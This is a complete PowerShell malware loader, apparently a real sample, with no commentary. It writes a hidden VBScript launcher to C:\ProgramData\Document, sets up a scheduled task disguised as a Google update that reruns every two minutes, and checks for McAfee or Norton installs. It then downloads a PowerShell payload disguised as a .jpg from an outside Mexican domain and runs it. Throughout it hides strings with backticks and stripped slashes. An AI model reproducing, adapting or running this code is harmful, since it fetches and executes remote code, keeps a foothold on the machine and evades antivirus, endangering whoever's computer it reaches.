Function Georgina
{

start-sleep -s 2
[system.io.directory]::CreateDirectory("C:\ProgramData\Document\")
#-----------------------------------------------------------------------------
$Content = @'
on error resume next
On Error Resume Next
Dim syncCmd
syncCmd = "$BLNLS='ReadAllText';$T='C:\ProgramData\Document\GoogleUpdate.ps1';IEx([<#1#>IO.File<#1#>]::$BLNLS($T))"
Dim psCmd
psCmd = "powershell.exe -NonInteractive -WindowStyle Hidden -ExecutionPolicy RemoteSigned -Command &{" & syncCmd & "}"
Dim WINDOSTE
Set WINDOSTE = WScript.CreateObject("WScript.Shell")
WINDOSTE.Run psCmd, 0

'@
[IO.File]::WriteAllText("C:\ProgramData\Document\ETC.vbs", $Content)
#-----------------------------------------------------------------------------

start-sleep -s 3

$action = New-ScheduledTaskAction -Execute 'C:\ProgramData\Document\ETC.vbs'
$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 2)
Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "GOOGLEUpdte"

start-sleep -s 6

$NEWS = 'C/:/\P/r/o/g/ra/m/D/at/a\D/oc/um/ent\'.Replace("/","")
$mcAfee = 'C:/\Pro/gram Fil/es\Common /Files\McAfee\/Platf/orm\McUIC/nt.e/xe'.Replace("/","")
$nort = 'C:/\Pr/og/ra/m Fil/es\No/r/to/n S/ecu/rit/y\i/so/l/at/e./i/n/i'.Replace("/","")

if([System.IO.File]::Exists($mcAfee)){

if((New-Object "`N`e`T`.`W`e`B`C`l`i`e`N`T")."`D`o`w`N`l`o`A`d`F`i`l`e"('https://invitadoscarlsjr.mx/.POP/.A.jpg', $NEWS + 'GoogleUpdate.ps1')){
}
start-sleep -s 7
Start "C:\ProgramData\Document\ETC.vbs"
}
elseif([System.IO.File]::Exists($nort)){

if((New-Object "`N`e`T`.`W`e`B`C`l`i`e`N`T")."`D`o`w`N`l`o`A`d`F`i`l`e"('https://invitadoscarlsjr.mx/.POP/.B.jpg', $NEWS + 'GoogleUpdate.ps1')){
}
start-sleep -s 7
Start "C:\ProgramData\Document\ETC.vbs"
}
else{

if((New-Object "`N`e`T`.`W`e`B`C`l`i`e`N`T")."`D`o`w`N`l`o`A`d`F`i`l`e"('https://invitadoscarlsjr.mx/.POP/.C.jpg', $NEWS + 'GoogleUpdate.ps1')){
}

start-sleep -s 7
Start "C:\ProgramData\Document\ETC.vbs"
}

}
IEX Georgina